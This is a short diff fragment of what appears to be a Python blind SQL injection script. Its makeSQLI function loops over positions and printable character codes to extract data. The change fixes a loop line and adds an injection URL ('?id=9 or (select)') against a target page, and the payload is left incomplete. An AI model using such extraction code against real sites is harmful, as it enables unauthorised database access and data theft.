@@ -71,5 +71,6 @@ def makeSQLI():
 	extracted_info = ""
 
 	for position in range(1, 200)
-		for character in range(33, 126)
+		for character in range(33, 126):
+			sqli_url = main_url + "?id=9 or (select)"
 ```
